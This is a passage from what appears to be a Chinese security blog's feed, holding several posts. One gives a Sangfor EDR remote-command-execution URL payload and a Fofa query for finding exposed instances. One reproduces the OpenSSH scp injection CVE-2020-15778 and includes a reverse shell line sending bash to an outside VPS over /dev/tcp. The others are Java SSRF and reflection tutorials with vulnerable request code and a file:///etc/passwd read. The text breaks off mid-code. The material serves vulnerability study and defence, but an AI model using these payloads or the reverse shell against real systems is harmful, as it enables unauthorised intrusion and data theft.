        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p>深信服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。</p><p>官网的原话。。。</p><h1 id="Fofa关键字："><a href="#Fofa关键字：" class="headerlink" title="Fofa关键字："></a><strong>Fofa关键字：</strong></h1><p>title=“终端检测响应平台”</p><p>界面：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTcyMzI5MjYucG5n?x-oss-process=image/format,png" alt="image-20200817232926734"></p><h1 id="0x02-RCE-payload"><a href="#0x02-RCE-payload" class="headerlink" title="0x02 RCE payload"></a>0x02 RCE payload</h1><p><strong>漏洞位置：host 参数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com:xxx&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;host&#x3D;id</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTcyMzMwNTMucG5n?x-oss-process=image/format,png" alt="image-20200817233053115"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com:xxx&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;host&#x3D;pwd</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTcyMzUxMDcucG5n?x-oss-process=image/format,png" alt="image-20200817235107599"></p><h1 id="0x03-处置建议"><a href="#0x03-处置建议" class="headerlink" title="0x03 处置建议"></a>0x03 处置建议</h1><p>目前官方未公布相关处置建议，临时处置可采取：</p><p>先下线吧，代码漏洞有点多。。<br>等更新</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-15778漏洞复现</title>
      <link href="/2020/08/03/CVE-2020-15778%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/08/03/CVE-2020-15778%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><p>SCP(secure copy)是linux系统下基于ssh登录进行安全远程文件拷贝的命令，可以在linux之间复制文件和目录。</p><p>OpenSSH中小于 8.3p1版本 SCP命令里存在命令注入漏洞。当将文件复制到远程服务器时，文件路径附加在本地scp命令的末尾，可以触发命令注入漏洞。</p><p>漏洞存在的点在 <a href="https://github.com/openssh/openssh-portable/blob/a2855c048b3f4b17d8787bd3f24232ec0cd79abe/scp.c#L989" target="_blank" rel="noopener">https://github.com/openssh/openssh-portable/blob/a2855c048b3f4b17d8787bd3f24232ec0cd79abe/scp.c#L989</a></p><p>攻击者可以采用反引号(`)文件作为命令注入执行scp命令，命令将会发送到远程服务器并执行。</p><p>作者介绍是</p><p>将文件复制到远程服务器时，文件路径会附加在本地scp命令的末尾。例如，如果执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp SourceFile user@host:directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure><p>它将执行本地命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -t directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure><p>大佬的原帖<a href="https://github.com/cpandya2909/CVE-2020-15778/" target="_blank" rel="noopener">https://github.com/cpandya2909/CVE-2020-15778/</a></p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>version: &lt;=openssh-8.3p1</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>靶机kali : 192.168.100.236</p><p>利用场景：已知 ssh 密码为 root</p><h2 id="查看当然版本和主机信息"><a href="#查看当然版本和主机信息" class="headerlink" title="查看当然版本和主机信息"></a>查看当然版本和主机信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -V &amp;&amp; ifconfig</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMDA0MzMucG5n?x-oss-process=image/format,png" alt="image-20200803100433615"></p><h2 id="正常连接拷贝一下，命令学习一下"><a href="#正常连接拷贝一下，命令学习一下" class="headerlink" title="正常连接拷贝一下，命令学习一下"></a>正常连接拷贝一下，命令学习一下</h2><p>攻击机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 本地文件 用户@远程IP：远程地址</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp ./config.yaml root@192.168.100.236:/root/zeo.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">#中途还是要身份验证，需要输入对应用户的密码</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMDA3MTUucG5n?x-oss-process=image/format,png" alt="image-20200803100715320"></p><p>受害机：拷贝成功</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMDA4NDQucG5n?x-oss-process=image/format,png" alt="image-20200803100844527"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>攻击机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">scp ./config.yaml root@192.168.100.236:<span class="string">'`touch /root/zeo_eval`/root/zeo2.yaml'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#’'`touch /root/zeo_eval`/root/zeo2.yaml' 单引号包裹全路径信息</span></span><br><span class="line"><span class="comment">#`touch /root/zeo_eval` 反引号包裹要执行的命令</span></span><br><span class="line"><span class="comment">#中途还是要身份验证，需要输入对应用户的密码</span></span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMDE1MzMucG5n?x-oss-process=image/format,png" alt="image-20200803101533314"></p><p>受害机：命令执行成功</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMDE4NDcucG5n?x-oss-process=image/format,png" alt="image-20200803101847532"></p><h2 id="反弹shell利用"><a href="#反弹shell利用" class="headerlink" title="反弹shell利用"></a>反弹shell利用</h2><p>VPS端：直接反弹加到payload里面发送，并开启nc监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp .&#x2F;config.yaml root@192.168.100.236:&#39;&#96;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;110.110.110.110&#x2F;6666 0&gt;&amp;1</span><br><span class="line">&#96;&#x2F;root&#x2F;zeo3.yaml&#39;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMTI0NTcucG5n?x-oss-process=image/format,png" alt=""></p><p>VPS接到bash</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDMxMTIxNDEucG5n?x-oss-process=image/format,png" alt="image-20200803112141012"></p><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ul><li>等待官方补丁</li><li>保护好自己的密码，ssh认证</li></ul><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>这个漏洞的利用还有点问题，因为还要bypass掉身份认证这个环节，才能远程命令执行，如果过了身份验证，那就牛逼大发了。</p><p>远程命令的执行，估计还得等大牛开发利用方式。</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计自学:从爬虫到SSRF漏洞</title>
      <link href="/2020/07/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6!%E4%BB%8E%E7%88%AC%E8%99%AB%E5%88%B0SSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/07/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6!%E4%BB%8E%E7%88%AC%E8%99%AB%E5%88%B0SSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>主要是因为自己的学习Java 代码审计中的学习思路吧，主要自己一个人学习，有点闭门造车，百度学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><p>这个是因为刚刚造轮子，学习了一下Java的GUI是怎么写的，造了一个轮子，要写一个爬虫，由于中间出现了小bug，看了看网络请求这块，后来发现顺便就是把SSRF这个漏洞就一起研究。</p><h1 id="0x01-SSRF漏洞"><a href="#0x01-SSRF漏洞" class="headerlink" title="0x01 SSRF漏洞"></a>0x01 SSRF漏洞</h1><p>SSRF(Server-Side Request Forge, 服务端请求伪造)，攻击者让服务端发起指定的请求，SSRF攻击的目标一般是从外网无法访问的内网系统。</p><p>这个不必多说了，直接copy吧</p><p>Java中的SSRF和PHP的有点区别：协议支持少一些，而且部分协议是受限的比如gopher协议，所以总体上来说Java的SSRF危害肯没PHP那么大。</p><p>通常 ssrf 容易出现的功能点，还是和php那些都一样：</p><p>基本上都是发起url请求的地方：</p><p>1、通过关键字 share、url、link、src、source、target、display、3g、target、domain、u</p><p>2、通过URL地址加载</p><p>3、下载图片、文章收藏功能</p><p>4、通过url 地址分享文章</p><h1 id="0x02-详情介绍"><a href="#0x02-详情介绍" class="headerlink" title="0x02 详情介绍"></a>0x02 详情介绍</h1><p>最开始是看到了URLConnection写的爬虫，后来发现这个算是比较原始的了，相当于直接请求出去，接受回来的字节码的流文件，没啥处理，直接接受，后面都得自己处理，比如 charset都得自己去匹配，要不又的是GBK有的是UTF-8的，写的好烦</p><h2 id="第一种：URLConnection-发起的请求"><a href="#第一种：URLConnection-发起的请求" class="headerlink" title="第一种：URLConnection 发起的请求"></a>第一种：URLConnection 发起的请求</h2><p>支撑的协议有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file ftp mailto http https jar netdoc gopher</span><br></pre></td></tr></table></figure><p>注意：</p><p><code>gopher</code> 实际在 jdk8 版本以后被阉割了，所以没有PHP那种SSRF那么牛逼了</p><p>先看一个简单的爬虫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLConnection;</span><br><span class="line"></span><br><span class="line">class URLConnectionDemo &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        URL url &#x3D; new URL(&quot;https:&#x2F;&#x2F;www.baidu.com&quot;);</span><br><span class="line">        &#x2F;&#x2F; 打开和url之间的连接</span><br><span class="line">        URLConnection connection &#x3D; url.openConnection();</span><br><span class="line">        &#x2F;&#x2F; 设置请求参数 键-通过该请求是已知的（例如，“关键字Accept ”）</span><br><span class="line">        connection.setRequestProperty(&quot;user-agent&quot;, &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;69.0.3497.100 Safari&#x2F;537.36&quot;);</span><br><span class="line">        &#x2F;&#x2F;设置指定的超时值</span><br><span class="line">        connection.setConnectTimeout(1000);</span><br><span class="line">        &#x2F;&#x2F;如果是写爬虫的话，最后加上，要不一直抛出异常重试，实测如果写特别影响效率，尤其是全网乱爬</span><br><span class="line">        &#x2F;&#x2F;将读超时设置为指定的超时，以毫秒为单位</span><br><span class="line">        connection.setReadTimeout(1000);</span><br><span class="line">        &#x2F;&#x2F; 建立实际连接</span><br><span class="line">        connection.connect();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 获取响应头字段信息列表</span><br><span class="line">        connection.getHeaderFields();</span><br><span class="line">        System.out.println(connection.getHeaderFields());</span><br><span class="line"></span><br><span class="line">        StringBuilder response &#x3D; new StringBuilder();</span><br><span class="line">        &#x2F;&#x2F;获取流到缓冲区</span><br><span class="line">        BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(connection.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        while ((line &#x3D; in.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            response.append(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.print(response.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、URL 建立一个对象， 调用openConnection 来获取一个 URLConnection 的实例</p><p>2、然后设置各种请求参数以及一些配置</p><p>3、使用其中的 connect 方法来发起请求，用 getInputStream 来获请求的响应流</p><p>4、最后接收自行处理</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>如果 URL 是可控的，那么就会存在 SSRF 漏洞</p><p>如果中间存在这句话，就不能使用gopher协议， 因为到不了发起请求的连接之前就会抛出异常中断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">con.setRequestMethod(&quot;GET&quot;);</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>URL 是可控的，file协议读取etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL url &#x3D; new URL(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MzExNDA5MTkucG5n?x-oss-process=image/format,png" alt="image-20200731140914542"></p><h2 id="第二种：限制过的http请求"><a href="#第二种：限制过的http请求" class="headerlink" title="第二种：限制过的http请求"></a>第二种：限制过的http请求</h2><p>还有一些封装过的http请求，这些其实都做过限制，或者要换协议直接抛异常了，所以鸡肋一些</p><p>大概就只能做内网探测了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HttpClient.execute</span><br><span class="line">HttpClient.executeMethod</span><br><span class="line">HttpURLConnection.connect</span><br><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URL.openStream</span><br><span class="line">Request.Get(url).execute()</span><br></pre></td></tr></table></figure><p>HttpClients漏洞示例</p><p>我后来改成这个做了爬虫，这个感觉兼容性不错的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">CloseableHttpClient client &#x3D; HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet &#x3D; new HttpGet(url);</span><br><span class="line">&#x2F;&#x2F;发起请求</span><br><span class="line">HttpResponse httpResponse &#x3D; client.execute(httpGet);</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h1><ul><li><p>限制协议为HTTP、HTTPS协议。</p></li><li><p>禁止URL传入内网IP或者设置URL白名单。</p></li></ul><p>302跳转这个问题是，Java会默认跟随跳转，但是跳转是有协议限制的，gopher都不行，所以限制上面那些就可以了。</p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>总的来说，Java的SSRF 漏洞比较受到限制，而且大家也比较少用原生的，封装过的用多一些？</p><p>大概率只能：</p><ul><li>利用file协议任意文件读取 （限制在URLConnection这种方式）</li><li>利用http协议端口探测</li><li>利用 http 进行 ntlmrelay 攻击 （这种大家自己研究一下吧。。。）</li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>凌天实验室–园长 Github <a href="https://github.com/anbai-inc/javaweb-sec" target="_blank" rel="noopener">javaweb-sec</a></p><p><a href="https://joychou.org/java/javassrf.html" target="_blank" rel="noopener">https://joychou.org/java/javassrf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计自学:反射机制</title>
      <link href="/2020/07/24/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6!%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
      <url>/2020/07/24/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%87%AA%E5%AD%A6!%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>主要是因为自己的学习Java 代码审计中的学习思路吧，主要自己一个人学习，有点闭门造车，百度学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><p>P牛的文章中说到：</p><p>Java安全可以从反序列化漏洞开始说起，反序列化漏洞⼜可以从反射开始说起。</p><h1 id="0x01-Java反射机制"><a href="#0x01-Java反射机制" class="headerlink" title="0x01 Java反射机制"></a>0x01 Java反射机制</h1><p>我之前觉得Java学起来感觉是比较死的，因为我只是站在变成的角度，php的各种动态的调用，免杀起来都方便的不行，但是发现java的提供的“反射”功能，也是可以提供⼀些动态特性，也是灵活的</p><p>所以，Java反射(<code>Reflection</code>)是Java非常重要的动态特性</p><p>我们通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息</p><p>还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><p>简单的说就是，我们用对象可以通过反射获取他的类，用类可以通过拿到它的所有⽅法（包括私有），拿到的⽅法可以为所欲为？？</p><h1 id="0x02-基础知识"><a href="#0x02-基础知识" class="headerlink" title="0x02 基础知识"></a>0x02 基础知识</h1><h2 id="⼏个在反射⾥极为重要的⽅法："><a href="#⼏个在反射⾥极为重要的⽅法：" class="headerlink" title="⼏个在反射⾥极为重要的⽅法："></a><strong>⼏个在反射⾥极为重要的⽅法：</strong></h2><h3 id="1-获取class的字节码对象："><a href="#1-获取class的字节码对象：" class="headerlink" title="1.获取class的字节码对象："></a><strong>1.获取class的字节码对象</strong>：</h3><p>Java反射操作的是<code>java.lang.Class</code>对象，所以我们需要先想办法获取到Class对象，通常我们有如下几种方式获取一个类的Class对象：</p><ol><li><p><code>类名.class</code>，如:<code>com.zeo.sec.Test.class</code>。如果你已经加载了某个类，那么就直接拿它的 class 属性</p></li><li><p><code>Class.forName(&quot;com.zeo.sec.Test.class&quot;)</code>。如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</p></li><li><p><code>classLoader.loadClass(&quot;com.zeo.sec.Test.class&quot;);</code></p></li><li><p><code>obj.getClass()</code>如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过obj.getClass() 来获取它的类</p></li></ol><p><strong>以最常用的代码执行获取Runtime类Class对象代码片段：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String className     = <span class="string">"java.lang.Runtime"</span>;</span><br><span class="line">Class  runtimeClass1 = Class.forName(className);</span><br><span class="line">Class  runtimeClass2 = java.lang.Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Class  runtimeClass3 = ClassLoader.getSystemClassLoader().loadClass(className);</span><br></pre></td></tr></table></figure><h3 id="2-获取名字"><a href="#2-获取名字" class="headerlink" title="2.获取名字"></a><strong>2.获取名字</strong></h3><p>可以反射类名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getName()//获取全名 例如：com.test.Demo</span><br><span class="line"></span><br><span class="line">getSimpleName()//获取类名 例如：Demo</span><br></pre></td></tr></table></figure><h3 id="3-获取构造函数"><a href="#3-获取构造函数" class="headerlink" title="3.获取构造函数"></a><strong>3.获取构造函数</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getConstructors()//获取所有公开的构造函数</span><br><span class="line"></span><br><span class="line">getConstructor(参数类型)//获取单个公开的构造函数</span><br><span class="line"></span><br><span class="line">getDeclaredConstructors()//获取所有构造函数</span><br><span class="line"></span><br><span class="line">getDeclaredConstructor(参数类型)//获取一个所有的构造函数</span><br></pre></td></tr></table></figure><p><strong>获取当前类所有的成员方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method[] methods = clazz.getDeclaredMethods()</span><br></pre></td></tr></table></figure><p><strong>获取当前类指定的成员方法：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Method method = clazz.getDeclaredMethod(<span class="string">"方法名"</span>);</span><br><span class="line">Method method = clazz.getDeclaredMethod("方法名", 参数类型如String.class，多个参数用","号隔开);</span><br></pre></td></tr></table></figure><h3 id="4-实例化类对象的⽅法：-newInstance（）"><a href="#4-实例化类对象的⽅法：-newInstance（）" class="headerlink" title="4.实例化类对象的⽅法： newInstance（）"></a>4.实例化类对象的⽅法： newInstance（）</h3><p>class.newInstance() 的作用就是调用这个类的无参构造函数，如果使用 newInstance 总是不成功，这时候原因可能是：</p><ol><li><p>你使用的类没有无参构造函数 （getConstructor方法解决）</p></li><li><p>你使用的类构造函数是私有的 （getDeclaredConstructor方法解决）</p></li></ol><h3 id="5-反射调用方法执⾏函数的⽅法：-invoke"><a href="#5-反射调用方法执⾏函数的⽅法：-invoke" class="headerlink" title="5.反射调用方法执⾏函数的⽅法： invoke"></a>5.反射调用方法执⾏函数的⽅法： invoke</h3><p>获取到<code>java.lang.reflect.Method</code>对象以后我们可以通过<code>Method</code>的<code>invoke</code>方法来调用类方法。</p><p><strong>调用类方法代码片段：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(方法实例对象, 方法参数值，多个参数值用<span class="string">","</span>隔开);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">invoke 的作用是执行方法，它的第一个参数是：</span><br><span class="line">如果这个方法是一个普通方法，那么第一个参数是 类的实例对象</span><br><span class="line">如果这个方法是一个静态方法，那么第一个参数是 类</span><br></pre></td></tr></table></figure><h1 id="0x03-特殊情况"><a href="#0x03-特殊情况" class="headerlink" title="0x03 特殊情况"></a>0x03 特殊情况</h1><h2 id="如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类"><a href="#如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类" class="headerlink" title="如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类"></a>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类</h2><p>使用新的反射方法 getConstructor</p><p>getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载，所以必须用参数列表类型才能唯一确定一个构造函数。<br>获取到构造函数后，我们使用 newInstance 来执行。<br>比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用start() 来执行命令</p><h2 id="如果一个方法或构造方法是私有方法，我们是否能执行它呢"><a href="#如果一个方法或构造方法是私有方法，我们是否能执行它呢" class="headerlink" title="如果一个方法或构造方法是私有方法，我们是否能执行它呢"></a>如果一个方法或构造方法是私有方法，我们是否能执行它呢</h2><p><strong>普通的 getMethod 、getDeclaredMethod 区别是：</strong><br>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法<br>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</p><p>getDeclaredConstructor和getConstructor都可以获取到类构造方法，区别在于：</p><p>getConstructor无法获取到私有方法，所以一般在获取某个类的构造方法时候我们会使用getDeclaredConstructor去获取构造方法。如果构造方法有一个或多个参数的情况下我们应该在获取构造方法时候传入对应的参数类型数组，如：<code>clazz.getDeclaredConstructor(String.class, String.class)</code>。</p><p>举个例子，前文我们说过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例化对象，进而执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line">Class runtimeClass1 = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">Constructor constructor = runtimeClass1.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span 